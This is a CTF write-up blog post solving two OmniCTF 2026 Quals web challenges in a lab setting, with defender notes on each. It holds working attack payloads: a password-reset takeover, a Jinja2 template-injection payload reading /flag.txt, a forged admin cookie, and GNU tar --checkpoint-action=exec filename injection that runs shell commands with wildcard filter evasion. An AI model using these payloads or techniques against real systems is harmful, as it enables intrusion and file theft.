---
title: "OmniCTF 2026 Quals Web Writeup: 2 Challenges Solved"
slug: "omnictf-2026-quals-web-writeup"
description: "OmniCTF 2026 Quals web step-by-step: Ganzir SSTI via a reset-token debug leak into a Jinja2 read_file helper; StayWild GNU tar --checkpoint-action filename injection."
date: 2026-07-19T16:00:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["OmniCTF 2026 Quals"]
tags:
  - "omnictf"
  - "omnictf 2026"
  - "omnictf quals"
  - "ctf writeup"
  - "web"
  - "server-side template injection"
  - "jinja2 ssti"
  - "password reset poisoning"
  - "debug endpoint leak"
  - "tar option injection"
  - "gnu tar checkpoint action"
  - "frontend disabled bypass"
  - "shell wildcard expansion"
  - "misdirection triage"
keywords:
  - "omnictf 2026 quals web writeup"
  - "omnictf ganzir writeup"
  - "omnictf staywild writeup"
  - "jinja2 read_file helper ssti"
  - "smtp_trace debug preview token leak"
  - "gnu tar checkpoint-action exec command injection"
  - "tar option injection through filenames"
  - "disabled beta upload button bypass"
  - "shell wildcard filter bypass nl symlink"
  - "http request smuggling misdirection ctf"
  - "jwt alg_note misdirection ctf"
  - "ctf step by step 2026"
toc: true
cover:
  image: "/images/articles/omnictf-2026-quals-web-writeup.png"
  alt: "OmniCTF 2026 Quals web writeup — two challenges solved covering Ganzir server-side template injection via a Jinja2 read_file helper reached through a debug field that leaked the one-time password-reset token for the plot-hinted Cassie account, and StayWild GNU tar --checkpoint-action option injection through upload filenames on a beta endpoint whose frontend disable was not paired with a backend check"
---

OmniCTF 2026 Quals' web track, built around two recurring lessons: **the "debug" field that made it to production**, and **the disabled-beta button that isn't actually disabled server-side**. Both challenges also come with a *loud* misdirection designed to burn most of the CTF window (Ganzir advertises HTTP request smuggling via response headers around `/employee`; StayWild dangles a client-side `innerHTML` sink at the visitor-notes widget). The intended chains are mundane by comparison, which is the point: trained triage means checking the boring-looking helper *before* chasing the noisy channel.

Handouts, per-challenge READMEs, and pure-stdlib solver scripts live at [Abdelkad3r/OmniCTF-2026-Quals](https://github.com/Abdelkad3r/OmniCTF-2026-Quals). This writeup covers the two web challenges I solved: Ganzir (SSTI via a reset-token debug leak into a Jinja2 `read_file` helper) and StayWild (GNU `tar --checkpoint-action` option injection through unfiltered upload filenames on a beta endpoint whose frontend disable was not paired with a backend check).

## The two OmniCTF 2026 Quals web challenges

| Challenge | Difficulty | Bug class / primitive | Flag |
|---|---|---|---|
| Ganzir | Medium | Three misconfigurations chain. `POST /reset` returns a base64 `smtp_trace` debug field that contains the one-time reset `preview_url` for the plot-hinted `cassie` account; account existence is oracled by whether `smtp_trace` is present in the JSON response even though the top-level `message` field claims to be indifferent. `POST /reset/<token>` accepts an arbitrary new password. Login as `cassie` unlocks Records-scoped navigation including `/briefing-template`, a Jinja2 renderer with a `read_file(path)` helper bound in the environment and operator notes that literally declare `flag copy: /flag.txt`. Payload: `{{ read_file("/flag.txt") }}`. | `CTF{ganzir_was_already_in_the_fire_plan}` |
| StayWild | Medium | Express + nginx wildlife archive. `robots.txt` points at unfinished "field archive tooling"; `/staging` accepts a `.tar` upload and creates a numbered workspace; the workspace page has a `disabled`/`hidden` beta form pointing at `/additional/<workspace>`. The frontend disable is not paired with a backend check, and a `role=admin` cookie is enough to reach it. During the additional extraction pass the uploaded archive **filenames** are re-invoked as command-line arguments to GNU `tar`, so multipart parts named `--checkpoint=1` and `--checkpoint-action=exec=<cmd>` trigger command execution. The workspace filter blocks `cat`/`grep`/`python3` and literal `/` paths but allows `nl`, `ls`, `tar`, and shell wildcards; hidden symlinks like `.paw -> /opt/wild/.cache/seed-574` let `nl .p*` reach the flag file without spelling the blocked path directly. Decode the reflected base64 to get the flag. | `omniCTF{w1ldc4rds_can_g3t_w1ld}` |

The two challenges share a defensive theme: **a control that "looks" defensive isn't a defence unless it's enforced at every layer the input touches**. Ganzir's `POST /reset` returns a consistent top-level `message` regardless of account existence (looks defensive), but leaks the reset token in a differentiator field (`smtp_trace`) that only appears for real accounts. StayWild disables the beta upload button in HTML (`disabled` attribute + `is-disabled` class + a "for admins only" JS toggle to re-enable it), but the backend route is still processing POSTs from anyone with `role=admin` in a cookie. In both cases the fix is at the layer the attacker actually reaches: strip debug fields at the JSON serialiser, enforce authorisation server-side.

## Methodology — check the plot-mentioned helper before the loud channel

A pattern that worked on both challenges: **the intended chain is telegraphed by the UI copy and the incident/plot beats, while the noisy attack surface is a misdirection**. Ganzir's `/employee` route returns headers advertising a CL.TE request-smuggling primer (`edge parser: honors Transfer-Encoding: chunked` and `bridge parser: trusts Content-Length before forwarding remaining bytes`) and even accepts a `raw_request` form field, but every combination of smuggling I tried still returned 403. The `/jwt` audit page renders the JWT and confirms `HS256 signature valid`, with the payload's own `alg_note` reading *"JWT is signed correctly; look elsewhere."* Both are unambiguous author signals: not the intended path.

The `/login` copy names the pivot (`Cassie from Records ... temporary access should use the identity relay`), the incident queue names the intended vulnerability class (`Level 5 field summaries migrated to emergency template renderer`), and the `/briefing-template` page's own operator notes literally spell out `helper: read_file(path)` and `flag copy: /flag.txt`. Every one of those is a plot beat that maps to a specific step in the exploit chain. The same shape applies to StayWild: `robots.txt` names "unfinished field archive tooling", the workspace page copy names "additional material can be attached only after the first extraction pass", and the disabled beta form's `data-beta-upload` attribute makes it grep-friendly. When the author is telegraphing the intended path this loudly, trained triage is to follow the loud text before chasing the loud channel.

Per-challenge walkthroughs follow.

## 1. Ganzir

An SCP-Foundation-flavoured intranet mirror with three deliberate misconfigurations that chain into a one-shot flag read.

### Step 1 — Recon

```
$ curl -sI https://ganzir-<id>.inst.omnictf.com/
HTTP/2 200
server: nginx/1.30.0
```

The dashboard is themed around SCP-5000 / Ganzir. Header advertises `raspberry-pi bridge // partial trust mode`, three departments (Records / Science / MTF), an "Employee Ingress" button, and an incident queue that reads more like a spec than flavour text:

```
I-19-442  Archive   degraded  Legacy recovery service re-enabled for Records staff.
I-19-517  Comms     jammed    Ganzir outbound intercepts present anomalous packet loss.
I-19-602  Briefing  sealed    Level 5 field summaries migrated to emergency template renderer.
```

I-19-442 = "the reset flow is deliberately busted." I-19-602 = "there's a template renderer." Route probe:

| path | code | note |
|---|---|---|
| `/` | 200 | dashboard |
| `/login` | 200 | form |
| `/reset` | 200 | recovery form |
| `/employee` | 403 | interesting headers; see misdirection notes below |
| `/records`, `/admin` | 403 | require session |
| `/robots.txt`, `/api` | 404 | nothing hidden |

### Step 2 — `/login` names the pivot

```html
<h1>Personnel Login</h1>
<p>Recovery bulletin: Cassie from Records has been assigned to the harness intake desk.
   Temporary access should use the identity relay.</p>
```

Two facts to bank. `cassie` is the intended identity (the rest of the directory `dr_lindholm`, `mtf_zeta19`, `o5_council` is out of scope). The relay path is `/reset`, not a password guess.

### Step 3 — Break `/reset`

The reset form does a JSON POST with an `X-Requested-With: recovery-console` header. Response for an unknown user:

```json
{
  "message": "If that account exists, a recovery link has been sent.",
  "ok": true,
  "relay_id": "Q-DAF09096"
}
```

Response for `username=cassie`:

```json
{
  "delivery": "site19-internal-mail",
  "message": "Recovery link sent to c***r@site19.int.",
  "ok": true,
  "relay_id": "Q-C878B348",
  "smtp_trace": "eyJyZWxheSI6IlEtQzg3OEIzNDgi..."
}
```

Two bugs simultaneously. First, the `smtp_trace` field is present *only* for real accounts even though the top-level `message` and `ok` fields are consistent; that's a username oracle. Second, the base64 `smtp_trace` decodes to:

```json
{
  "relay": "Q-C878B348",
  "rcpt": "cassie.mercer@site19.int",
  "preview_url": "http://ganzir-<id>.inst.omnictf.com/reset/6X69tumTqxfGOXbAVf0gvth3",
  "retention": "debug-preview-enabled"
}
```

The one-time reset link is *inside the API response*. We never need to see Cassie's mailbox. The `retention: debug-preview-enabled` field is the smoking-gun label the author left for defenders: this endpoint was meant for staging and shipped to production.

### Step 4 — Take over Cassie and log in

```
POST /reset/6X69tumTqxfGOXbAVf0gvth3
password=whatever
```

Reply is `302 → /login` with a flash cookie confirming *"Password reset accepted."*

```
POST /login
username=cassie&password=whatever
```

Server sets three cookies:

- `site19_jwt`: HS256 JWT with payload `{"sub":"cassie","iat":..., "exp":..., "alg_note":"JWT is signed correctly; look elsewhere."}`. Skip it. The author is telling you the crypto is fine, and it is.
- `site19_session`: the actual Flask session cookie.
- `site19_employee_gate=; Max-Age=0`: clearing an earlier gate cookie.

The `/employee` route stays 403 (see misdirection notes below), but the top nav quietly widens to:

```
/directory  /records  /anomalies  /comms  /planner  /briefing-template  /jwt  /profile  /logout
```

### Step 5 — The template page hands over the exploit

`GET /briefing-template`:

```html
<h1>Briefing Template Dry Run</h1>
<form method="post" action="/briefing-template">
  <textarea name="template">Ganzir strike wave: {{ wave }}
Vector: {{ vector }}</textarea>
</form>
```

And the operator notes on the same page:

```
engine: Jinja2
variables: wave, vector
helper: read_file(path)
flag copy: /flag.txt
```

Three gifts. Live Jinja2 renderer reachable to any authenticated Records user. A `read_file()` helper bound in the template environment (no `{{ config }}`, no `{{ get_flashed_messages }}`, no `''.__class__.__mro__[1].__subclasses__()` gymnastics needed). The flag's exact path.

### Step 6 — Trigger the SSTI

```
POST /briefing-template
Content-Type: application/x-www-form-urlencoded

template={{ read_file("/flag.txt") }}
```

Rendered preview inside the returned HTML:

```html
<section class="panel">
  <h2>Rendered Preview</h2>
  <pre>CTF{ganzir_was_already_in_the_fire_plan}
</pre>
</section>
```

Flag: `CTF{ganzir_was_already_in_the_fire_plan}`.

### Misdirection notes

Two carefully-designed sirens that would have burned hours if I'd chased them first.

**`/employee` "HTTP request smuggling."** The 403 response leaks headers advertising a CL.TE parser mismatch (`edge parser: honors Transfer-Encoding: chunked`, `bridge parser: trusts Content-Length before forwarding remaining bytes`) and accepts a `raw_request` form field. Every smuggling shape I tried (chunked + Content-Length via HTTP/1.1, HTTP/2 downgrade, `raw_request` smuggle with `X-Employee-Gate: internal`) still returned 403. The "internal" gate isn't real; it's a dead-end designed to sink time.

**`/jwt` "Token Audit."** Renders the JWT and confirms `HS256 signature valid`. The `alg_note` in the payload reads *"JWT is signed correctly; look elsewhere."* No `alg=none`, no key confusion, no `kid` injection.

Both cost me maybe five minutes each *because I checked the plot-mentioned template renderer first*. If I'd started with the loud channel I'd have spent the whole slot on smuggling variants.

Per-challenge README + solver: [web/ganzir](https://github.com/Abdelkad3r/OmniCTF-2026-Quals/tree/main/web/ganzir).

## 2. StayWild

An Express + nginx wildlife archive with a two-pass tar processing pipeline. The intended chain has four moving parts (frontend `disabled` bypass, tar option injection through filenames, whitelist filter, wildcard-expandable symlinks); each one is small on its own, dangerous together.

### Step 1 — Recon and dismiss the notes-widget trap

```
$ curl -skI https://staywild-<id>.inst.omnictf.com/
HTTP/2 200
server: nginx/1.30.0
x-powered-by: Express
set-cookie: role=visitor; Path=/; SameSite=Lax
```

The homepage has a "visitor notes" widget that stores strings in `localStorage` and renders them with `innerHTML`. That's a tempting DOM-XSS rabbit hole, but no bot service was exposed and no note-submission endpoint fires cross-user, so the sink has no reachable oracle. Treat as noise.

`robots.txt` is the first useful hint:

```
User-agent: *

# Field archive tooling is not ready for public indexing.
```

Short directory fuzz finds `/staging`:

```
index.html   200
robots.txt   200
staging      200
```

### Step 2 — The staging upload

`GET /staging`:

```html
<form action="/staging" method="POST" enctype="multipart/form-data">
  <input type="file" name="file" accept=".tar" required />
  <button type="submit">Process archive</button>
</form>
```

Copy around the form is unusually specific and reads like a spec of the intended two-pass pipeline:

```
Field bundles are unpacked in a controlled workspace before any extra material is attached to the report.
Additional materials can be attached after the first extraction pass.
Only .tar files are accepted at this stage.
The first upload creates the workspace.
Extra files are attached only after this archive is processed.
```

Upload a harmless tarball and the server returns a redirect to a workspace URL:

```
$ tar -cf simple.tar hello.txt
$ curl -skI -F 'file=@simple.tar' https://staywild-<id>.inst.omnictf.com/staging
HTTP/2 303
location: /staging/1784313460974
```

### Step 3 — The disabled beta endpoint still works

The workspace page contains a disabled additional-upload form:

```html
<form action="/additional/1784313460974" method="POST" enctype="multipart/form-data">
  <input data-beta-upload disabled type="file" name="file" multiple hidden>
  <button data-beta-upload disabled type="button">Upload additional files</button>
</form>
```

Plus a "for admins only" JavaScript helper that just removes the `disabled` attribute client-side:

```js
// Only for admins
window.enableExperimentalIntake = function () {
  document.querySelectorAll("[data-beta-upload]").forEach((el) => {
    el.removeAttribute("disabled");
    el.classList.remove("is-disabled");
  });
  localStorage.setItem("experimentalIntake", "enabled");
};
```

The button being disabled is a browser-side control. A direct POST to `/additional/<workspace>` reaches the backend; supplying `Cookie: role=admin` is enough to follow the intended "admin beta" path.

### Step 4 — Understand the second pass

Uploading an additional tar causes the workspace log to reveal how the server invokes `tar`:

```
[extraction 2] additional extraction pass
tar: simple.tar: Not found in archive
tar: test.tar: Not found in archive
tar: Exiting with failure status due to previous errors

[additional archive: test.tar]
photo.jpg
```

The error is diagnostic. During the additional pass, the service *re-extracts the initial tar while appending workspace filenames as extra tar arguments*. So the uploaded archive filename is attacker-controlled input flowing into a shell-adjacent CLI.

### Step 5 — Tar option injection through filenames

GNU tar has a checkpoint feature:

```
tar --checkpoint=1 --checkpoint-action=exec=id -xf archive.tar
```

If those two options reach tar, it runs `id` during extraction. The workspace intake filter blocks many obvious commands and some filenames, but it does not filter filenames that *start with `--checkpoint`*. Sending two multipart parts with the injected names:

```
filename="--checkpoint=1"
filename="--checkpoint-action=exec=id"
```

Workspace log:

```
[extraction 27] additional extraction pass
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
base.txt
tar: base.tar: Not found in archive
tar: plain.txt: Not found in archive
tar: Exiting with failure status due to previous errors
```

Command execution as `ctf` with output reflected in the log.

### Step 6 — Bypass the filter with a shell wildcard

Trying `cat`, `grep`, `python3`, or any path containing `/` was rejected by the intake filter. A few commands survived: `ls`, `nl`, `tar`. `ls -la .*` showed the workspace was seeded with hidden symlinks:

```
lrwxrwxrwx 1 ctf ctf    8 .audit -> /var/log
lrwxrwxrwx 1 ctf ctf   11 .creek -> /dev/stdout
lrwxrwxrwx 1 ctf ctf   25 .paw   -> /opt/wild/.cache/seed-574
lrwxrwxrwx 1 ctf ctf    4 .roots -> /etc
lrwxrwxrwx 1 ctf ctf    4 .stash -> /tmp
lrwxrwxrwx 1 ctf ctf   16 .trail -> /opt/wild/public
```

The filter rejected some literal symlink names but did not reject shell wildcards. Since `--checkpoint-action=exec=...` runs through a shell, `nl .p*` expands to `.paw` at runtime and reads the target file. Final injected filenames:

```
--checkpoint=1
--checkpoint-action=exec=nl .p*
```

Log output:

```
[extraction 30] additional extraction pass
     1  b21uaUNURnt3MWxkYzRyZHNfY2FuX2czdF93MWxkfQ==
base.txt
tar: base.tar: Not found in archive
tar: plain.txt: Not found in archive
tar: Exiting with failure status due to previous errors
```

### Step 7 — Decode

```
$ printf '%s' 'b21uaUNURnt3MWxkYzRyZHNfY2FuX2czdF93MWxkfQ==' | base64 -d
omniCTF{w1ldc4rds_can_g3t_w1ld}
```

Flag: `omniCTF{w1ldc4rds_can_g3t_w1ld}`.

Per-challenge README + solver: [web/staywild](https://github.com/Abdelkad3r/OmniCTF-2026-Quals/tree/main/web/staywild).

## Cross-cutting defender notes

Six patterns recur across the OmniCTF 2026 Quals web track and translate directly into review or triage heuristics.

**Debug fields don't belong in production API responses.** Ganzir's `smtp_trace` was a base64-encoded internal-mail trace that should have been dropped at the response serialiser in any non-staging environment. It carried the one-time reset token in the same JSON body that returns to any anonymous caller. Real-world analogues: Rails `RecordNotFound` stack traces, Django `DEBUG=True` yellow error pages, Spring Boot Actuator's `/env` endpoint, Laravel `.env` disclosed via debug pages. The defence is not "sanitise the debug field," it's "the response envelope should not carry any field the endpoint owner didn't put there on purpose."

**Existence oracles have to be verified end-to-end.** Ganzir's `POST /reset` correctly returned a consistent top-level `message` for real vs fake accounts, but leaked the difference in a *supplemental* field (`smtp_trace` present or absent). Same class shows up in login endpoints that return the same "Invalid credentials" text but differ in response time, in Set-Cookie headers, or in body length by a few bytes. When designing an anti-oracle response, diff the *entire response envelope* between the real and fake paths, including headers, cookies, body length, and timing.

**Frontend `disabled` is not access control.** StayWild's `/additional/<workspace>` endpoint was gated only by a `disabled` attribute + an "admin-only" JS toggle. The route was open to anyone with `role=admin` in a cookie. Same class: HTML `maxlength`, JavaScript regex validators on form fields, "read-only" UI toggles, admin buttons hidden by CSS. If a route exists, it needs server-side authorisation. The Chrome DevTools "Remove attribute" and "Toggle element state" tools are one keypress each; assume every attacker has done it before you added the attribute.

**Attacker-controlled filenames flowing to CLI arguments = option injection.** GNU `tar --checkpoint-action=exec=<cmd>` is the canonical CTF example, but the same class applies to any tool that treats `--foo` before positional arguments: `rsync -e/--rsh`, `wget -O` overwriting arbitrary paths, `curl --output`/`--config`, `git upload-pack --keep-alive`, `find -exec`, `zip -T`. The mitigation is to always pass user-controlled arguments after `--` (which tells GNU-style tools to stop parsing options), and to enforce a `basename()`-like whitelist that rejects any filename starting with `-`. Reject at both layers.

**Bind minimal helpers into template environments.** Ganzir's Jinja2 environment had `read_file(path)` bound so operators could stitch templates from disk. `read_file(path)` in a template environment is equivalent to arbitrary file read for anyone who can submit template source. If Records staff must preview templates, render them as pure data with a `SandboxedEnvironment`, `autoescape=True`, and no custom filters, or move the renderer behind an operator-signing step so template source is not attacker-authored. Same class: Flask's `Markup(...)` on user input, Django's `mark_safe(...)`, any Nunjucks/Handlebars/Twig `raw` filter reachable by non-admin users.

**Loud misdirection is often deliberate misdirection.** Response headers advertising parser mismatches (`edge parser: honors Transfer-Encoding: chunked`), JWT payloads with `alg_note` fields, DOM-XSS sinks with no reachable cross-user bot: all three showed up in this two-challenge track. The lesson isn't "ignore loud channels" (sometimes they are the intended path), but "when a loud channel and a mundane channel are both present, check the mundane one first." The author's plot beats and UI copy are usually the strongest signal about which channel matters.

## Frequently asked questions

### What is OmniCTF 2026 Quals?

OmniCTF 2026 Quals is the qualifier round of the OmniCTF 2026 competition. Challenges span web, pwn, reverse, crypto, game, misc, and forensics. Flags use event-specific namespaces (`CTF{...}`, `OMNICTF{...}`, `OmniCTF{...}`, `omniCTF{...}`) depending on the challenge author's choice. This writeup covers the two web challenges I solved (Ganzir, StayWild). Per-challenge READMEs, handouts, and pure-stdlib Python solvers are mirrored at [Abdelkad3r/OmniCTF-2026-Quals](https://github.com/Abdelkad3r/OmniCTF-2026-Quals).

### How does the Ganzir reset-token leak work?

`POST /reset` returns a JSON body whose top-level `message` field is consistent for real and fake accounts (`If that account exists, a recovery link has been sent.`). But the response envelope also contains an `smtp_trace` field, base64-encoded, that is only present for real accounts. Decoding it yields `{"relay":..., "rcpt": "cassie.mercer@site19.int", "preview_url": "http://.../reset/<token>", "retention": "debug-preview-enabled"}`. The one-time reset link is in the API response. `POST /reset/<token>` accepts an arbitrary new password. The intended target is named in the `/login` copy (*"Cassie from Records has been assigned to the harness intake desk"*), so no username brute force is needed.

### How does the Ganzir SSTI chain work?

After hijacking Cassie's account, the authenticated top nav widens to include `/briefing-template`, a Jinja2 renderer for "briefing template dry runs". The operator notes on the same page literally spell out `engine: Jinja2`, `helper: read_file(path)`, and `flag copy: /flag.txt`. The `read_file(path)` helper is bound in the template environment, so no PHP-object-graph or `__mro__[1].__subclasses__()` gymnastics are required. Payload: `template={{ read_file("/flag.txt") }}`. The rendered preview echoes `CTF{ganzir_was_already_in_the_fire_plan}` inside a `<pre>` block.

### Why is `/employee` HTTP request smuggling in Ganzir a misdirection?

The `/employee` 403 response leaks headers advertising a CL.TE parser mismatch (`edge parser: honors Transfer-Encoding: chunked`, `bridge parser: trusts Content-Length before forwarding remaining bytes`) and accepts a `raw_request` form field designed to look like a raw HTTP smuggle vector. Every smuggling combination (HTTP/1.1 chunked + Content-Length, HTTP/2 downgrade, `raw_request` with `X-Employee-Gate: internal`) still returns 403. The "internal" gate is not a real state; it's a designed dead-end. Same for `/jwt`: the endpoint renders the JWT and confirms `HS256 signature valid`, with a payload `alg_note` that reads *"JWT is signed correctly; look elsewhere."* Both are author signals to stop chasing that surface.

### How does the StayWild `/additional` frontend-disable bypass work?

The workspace page contains a `<form action="/additional/<workspace>">` whose `<input>` and `<button>` both carry the `disabled` attribute plus an `is-disabled` class. A JavaScript helper `enableExperimentalIntake()` removes both, and a note calls it "for admins only". None of that is enforced server-side. A direct `POST /additional/<workspace>` with `Cookie: role=admin` reaches the backend and triggers the additional extraction pass. The `role=admin` cookie is set by simply sending `Cookie: role=admin` in the request; there's no signed session on this challenge.

### What is GNU tar's `--checkpoint-action=exec=` and how does StayWild expose it?

GNU tar's `--checkpoint=N` option triggers a callback every N records extracted. `--checkpoint-action=exec=<cmd>` sets that callback to run `<cmd>` through a shell. If both options reach tar, it executes the command during extraction. StayWild's additional-pass code re-invokes tar and appends workspace filenames as CLI arguments. Since multipart part names are attacker-controlled and the intake filter doesn't reject names starting with `--`, sending two parts named `--checkpoint=1` and `--checkpoint-action=exec=<cmd>` gets both options onto the tar command line and executes the command as the `ctf` user. The mitigation is to pass user-controlled arguments after `--` (tells GNU tools to stop parsing options) and reject any filename starting with `-`.

### Why does `nl .p*` work when direct paths and other commands are blocked?

The workspace intake filter rejects command names like `cat`, `grep`, `python3` and rejects filenames or arguments containing `/`. It allows `ls`, `nl`, `tar`. Since `--checkpoint-action=exec=<cmd>` runs through a shell, the argument to `nl` is expanded by the shell before `nl` sees it. The workspace is seeded with hidden symlinks (`.paw -> /opt/wild/.cache/seed-574`, `.trail -> /opt/wild/public`, etc.), so `nl .p*` expands to `.paw` at runtime and reads the target file `/opt/wild/.cache/seed-574` without the exploit filename ever containing the string `/opt/wild/.cache/seed-574`. Filter rejects literal paths but not shell wildcards.

### What defensive pattern would have prevented both challenges?

For Ganzir: strip debug fields at the response serialiser in production (`if not DEBUG: response.pop("smtp_trace", None)`), and diff the entire response envelope (body, headers, cookies, length, timing) between the real and fake reset paths to close the existence oracle. Bind the minimum necessary helpers into template environments, or use `SandboxedEnvironment` with `autoescape=True`. For StayWild: enforce authorisation server-side on every route (`disabled` HTML attributes are cosmetic), reject uploaded filenames starting with `-`, always pass user-controlled arguments after `--` on any tar/rsync/wget/curl/git CLI invocation, and lock down the workspace filesystem so attacker-controlled writes can't ride on shell wildcards.

### What's the broader lesson from the OmniCTF 2026 Quals web track?

*Frontend controls are not backend controls, and debug fields don't belong in production API responses.* Both bugs are mundane by CTF standards but pattern-match to a huge class of real-world security incidents. The Ganzir chain has real-world analogues in every "debug field leaked into JSON response" bug (Rails stack traces, Django `DEBUG=True`, Spring Actuator `/env`, Kubernetes secret volumes with `stringData` echoing to API responses). The StayWild chain pattern-matches every "disabled beta button" bypass (feature-flagged admin routes without server-side authz), and the tar option injection is the same class as the many CI pipeline compromises via attacker-controlled Git repo filenames flowing into `tar`, `rsync`, or `find` on the runner. Also: the "loud" attack surface is usually loud on purpose; check the mundane channel first.

### Where can I find the solver scripts?

Per-challenge READMEs, handouts, and pure-stdlib Python solvers are at [Abdelkad3r/OmniCTF-2026-Quals](https://github.com/Abdelkad3r/OmniCTF-2026-Quals). Each challenge has a `solve.py` that reproduces the flag against a fresh instance. Both solvers use only the Python standard library (`urllib`, `json`, `base64`, `tarfile`, `io`), no `requests`, no `pwntools`. Python 3.8+ is sufficient.

## Closing notes

Two web challenges, one shared discipline: **when the artefact hands you a plot-mentioned helper and a loud noisy channel, check the helper first**. Ganzir's `read_file(path)` bound in a Jinja2 environment reachable to any Records-scoped user is the whole exploit; the smuggling headers and JWT audit page were designed to eat hours. StayWild's `/additional/<workspace>` endpoint with a disabled frontend button and unfiltered filenames flowing to `tar` is the whole exploit; the DOM-XSS notes widget was there to eat hours. The mundane bug is the intended bug in both cases.

For the same event's pwn track, the [OmniCTF 2026 Quals pwn writeup](/ctf-writeups/omnictf-2026-quals-pwn-writeup/) covers nullshui (glibc 2.39 heap null-write to tcache poison over `_IO_2_1_stdout_` with a fake wide-file vtable calling `setcontext` to pivot to a heap ROP chain) and WinCapture (Windows kernel-driver `COPY` IOCTL TOCTOU race between two reads of `slot_lengths`, exploited via named-pipe partial sends to interleave a LOAD write into a 4 KB overflow into an adjacent key object). For the reverse track, the [OmniCTF 2026 Quals reverse writeup](/ctf-writeups/omnictf-2026-quals-reverse-writeup/) covers CredVault (Parcel migration mismatch between two validators), Gatekeep (FPGA byte-circuit solved as a constraint system), Kant (Rust checker pipeline inverted from the embedded compare target), and Pusher (signal-driven i386 VM with a `%d` vs `%c` scanf trap). For the crypto track, the [OmniCTF 2026 Quals crypto writeup](/ctf-writeups/omnictf-2026-quals-crypto-writeup/) covers dual_linera (CRT-collapse two-modulus LWE with LLL on a 20x20 lattice), Whiskerfield-Meowtin (DH mod `65537^16` one-byte patch to drive shared secret to 0), and Orbital-Strike-Cannon (non-associative octonion state solved by per-satellite RREF). For the game track, the [OmniCTF 2026 Quals game writeup](/ctf-writeups/omnictf-2026-quals-game-writeup/) covers permissiondenied (Minecraft `/demote` negative-index privesc) and Shibiu (Minecraft world differential analysis + block palette decode). For the misc track, the [OmniCTF 2026 Quals misc writeup](/ctf-writeups/omnictf-2026-quals-misc-writeup/) covers baccarat (Kelly x2 bet sizing against a weak agent), Node (Node-RED unauth RCE + SUID `DT_RUNPATH` privesc), nostalgia (Scratch `.sb3` embedding a RISC-V Linux ROM), and Sanity P0zzl3 (100-piece jigsaw CP-SAT + QR morphological repair). For adjacent web content on the same site, the [BroncoCTF 2026 web + crypto writeup](/ctf-writeups/broncoctf-2026-web-crypto-writeup/) covers a SQLite `LIKE` injection around a keyword-stripping WAF, a `robots.txt` base64 leak with reversed-username rule, an `/api/config` credential leak with `{authenticated:true}` client-side trust, and a CSS-blur "gate" that isn't a gate: all in the same "client-side control isn't a control" family. The [Junior.Crypt 2026 web + crypto writeup](/ctf-writeups/junior-crypt-2026-web-crypto-writeup/) covers a first-line-only PHP validator bypassed by a newline shell separator (same "validator/sink mismatch" class as StayWild's frontend/backend disable) and an HS256 JWT with a wordlist-cracked `butterfly` secret. The [LYKNCTF 2026 web writeup](/ctf-writeups/lyknctf-2026-web-writeup/) covers a Legacy Profile Importer AES-CBC padding oracle (CBC-R) plus SSRF+SSTI, PHP `.php5` bypass, and SQLi-to-RCE. The [R3CTF 2026 master writeup](/ctf-writeups/r3ctf-2026-writeup/) has mafuyuuuuu (.NET `xoshiro256**` state recovery via 160 leaked outputs) and r3ticket (Lagrange-basis oracle abuse via `get_num(nums, -K)`). Full [CTF writeups index](/ctf-writeups/) for the rest.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is OmniCTF 2026 Quals?","acceptedAnswer": {"@type": "Answer","text": "OmniCTF 2026 Quals is the qualifier round of the OmniCTF 2026 competition, with challenges spanning web, pwn, reverse, crypto, game, misc, and forensics. Flags use event-specific namespaces (CTF{...}, OMNICTF{...}, OmniCTF{...}, omniCTF{...}) depending on the challenge. This writeup covers the two web challenges I solved (Ganzir, StayWild). Per-challenge READMEs and pure-stdlib solvers at github.com/Abdelkad3r/OmniCTF-2026-Quals."}},
    {"@type": "Question","name": "How does the Ganzir reset-token leak work?","acceptedAnswer": {"@type": "Answer","text": "POST /reset returns a top-level message consistent for real and fake accounts, but the response envelope also carries an smtp_trace field (base64) only for real accounts. Decoding smtp_trace yields the one-time reset preview_url in-band. POST /reset/<token> accepts an arbitrary new password. The intended target (cassie) is named in the /login copy, so no username brute force is needed."}},
    {"@type": "Question","name": "How does the Ganzir SSTI chain work?","acceptedAnswer": {"@type": "Answer","text": "After hijacking Cassie, the top nav widens to include /briefing-template, a Jinja2 renderer whose operator notes literally declare engine: Jinja2, helper: read_file(path), flag copy: /flag.txt. Payload template={{ read_file('/flag.txt') }} is echoed into a <pre> block as CTF{ganzir_was_already_in_the_fire_plan}. No __mro__ gymnastics needed because the helper is bound in the environment."}},
    {"@type": "Question","name": "Why is /employee HTTP request smuggling in Ganzir a misdirection?","acceptedAnswer": {"@type": "Answer","text": "The 403 response advertises a CL.TE parser mismatch and accepts a raw_request form field, but every smuggling combination still returns 403 because the internal gate isn't a real state. /jwt is the same: renders the JWT with HS256 signature valid and a payload alg_note saying 'JWT is signed correctly; look elsewhere.' Both are author signals to stop chasing that surface."}},
    {"@type": "Question","name": "How does the StayWild /additional frontend-disable bypass work?","acceptedAnswer": {"@type": "Answer","text": "The workspace page has a <form action='/additional/<workspace>'> whose input and button both carry the disabled attribute. A JS helper enableExperimentalIntake() removes them for 'admins only'. None of that is server-enforced. Direct POST /additional/<workspace> with Cookie: role=admin reaches the backend. There is no signed session; the role cookie is trusted verbatim."}},
    {"@type": "Question","name": "What is GNU tar's --checkpoint-action=exec= and how does StayWild expose it?","acceptedAnswer": {"@type": "Answer","text": "GNU tar's --checkpoint=N triggers a callback every N records; --checkpoint-action=exec=<cmd> makes that callback a shell command. StayWild's additional-pass code re-invokes tar with workspace filenames as CLI arguments. Sending two multipart parts named --checkpoint=1 and --checkpoint-action=exec=<cmd> gets both options onto tar's command line and executes the command as the ctf user. Mitigation: always pass user-controlled arguments after -- and reject filenames starting with -."}},
    {"@type": "Question","name": "Why does nl .p* work when direct paths are blocked?","acceptedAnswer": {"@type": "Answer","text": "The intake filter rejects command names like cat/grep/python3 and any argument containing /. It allows ls, nl, tar. Because --checkpoint-action=exec runs through a shell, the argument to nl is expanded by the shell before nl sees it. Workspace symlinks include .paw -> /opt/wild/.cache/seed-574, so nl .p* expands at runtime to .paw and reads the target without the exploit ever containing the blocked path string."}},
